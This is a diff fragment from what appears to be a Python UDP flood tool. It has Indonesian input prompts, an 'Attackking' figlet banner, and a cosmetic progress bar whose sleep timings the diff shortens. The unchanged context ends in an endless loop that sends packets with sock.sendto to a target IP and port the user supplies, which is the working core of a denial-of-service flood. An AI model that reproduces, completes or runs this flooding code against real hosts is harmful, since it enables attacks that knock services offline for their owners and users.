@@ -29,15 +29,15 @@ port = input("masukkan PORT       : ")
 os.system("clear")
 os.system("figlet Attackking")
 print "[                    ] 0% "
-time.sleep(4)
-print "[=====               ] 25%"
-time.sleep(4)
-print "[==========          ] 50%"
-time.sleep(4)
-print "[===============     ] 75%"
-time.sleep(4)
-print "[====================] 100%"
 time.sleep(3)
+print "[=====               ] 25%"
+time.sleep(3)
+print "[==========          ] 50%"
+time.sleep(3)
+print "[===============     ] 75%"
+time.sleep(3)
+print "[====================] 100%"
+time.sleep(2)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
